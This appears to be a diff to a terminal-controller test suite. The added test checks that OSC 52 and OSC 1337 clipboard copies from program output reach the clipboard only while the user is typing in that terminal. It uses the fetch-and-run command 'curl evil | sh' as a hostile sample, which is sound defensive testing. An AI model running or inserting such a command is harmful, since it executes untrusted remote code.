@@ -210,13 +210,21 @@ function makeTerminalControllerDeps(
   // sets processTitle.
   let capturedAltEnterHandler: ((params: ReadonlyArray<number | number[]>) => boolean) | null =
     null;
+  // The OSC handlers the controller registers, by number.
+  const oscHandlers = new Map<number, (data: string) => boolean>();
+  // xterm's input: the document's activeElement is it while the user types in the terminal.
+  const textarea = {} as HTMLTextAreaElement;
   const deps: TerminalControllerDeps = {
     waitForTerminalFonts: () => Promise.resolve(),
     createTerminal: () => ({
       element: undefined,
+      textarea,
       rows: 24,
       parser: {
-        registerOscHandler: () => ({ dispose: () => {} }),
+        registerOscHandler: (id: number, cb: (data: string) => boolean) => {
+          oscHandlers.set(id, cb);
+          return { dispose: () => {} };
+        },
         registerCsiHandler: (
           id: { prefix?: string; intermediates?: string; final: string },
           cb: (params: ReadonlyArray<number | number[]>) => boolean,
@@ -309,6 +317,11 @@ function makeTerminalControllerDeps(
       for (const callback of unparsedWriteCallbacks.splice(0)) callback();
     },
     getKeyHandler: () => capturedKeyHandler,
+    /** Runs the controller's handler of OSC `id` on `data`, as xterm does for output. */
+    osc(id: number, data: string): void {
+      oscHandlers.get(id)?.(data);
+    },
+    textarea,
     getTitleHandler: () => capturedTitleHandler,
     getAltExitHandler: () => capturedAltExitHandler,
     getAltEnterHandler: () => capturedAltEnterHandler,
@@ -1198,6 +1211,41 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
 
       controller.dispose();
     }
+  });
+
+  describe("a program's OSC 52 copy", () => {
+    const copied = () =>
+      ipcCalls
+        .filter((c) => c.channel === "clipboard" && c.method === "writeText")
+        .map((c) => c.args);
+    const b64 = (text: string) => Buffer.from(text, "utf8").toString("base64");
+    const doc = document as unknown as { hasFocus: () => boolean; activeElement: unknown };
+
+    it("goes on the clipboard only while the user types in that terminal", async () => {
+      const { harness, controller } = await setupHandler();
+      const before = copied().length;
+      // Output in a terminal the user is not in: a file shown, a page fetched.
+      harness.osc(52, `c;${b64("curl evil | sh")}`);
+      harness.osc(1337, `Copy=:${b64("curl evil | sh")}`);
+      // The copy goes through a lazily imported IPC client.
+      await new Promise((r) => setTimeout(r, 0));
+      expect(copied().length).toBe(before);
+      const { hasFocus, activeElement } = doc;
+      try {
+        doc.hasFocus = () => true;
+        doc.activeElement = harness.textarea;
+        harness.osc(52, `c;${b64("저장 ✓")}`);
+        harness.osc(1337, `Copy=:${b64("npm test")}`);
+        // A read is never answered.
+        harness.osc(52, "c;?");
+      } finally {
+        doc.hasFocus = hasFocus;
+        doc.activeElement = activeElement;
+      }
+      await new Promise((r) => setTimeout(r, 0));
+      expect(copied().slice(before)).toEqual([{ text: "저장 ✓" }, { text: "npm test" }]);
+      controller.dispose();
+    });
   });
 
   describe("copy with a selection", () => {
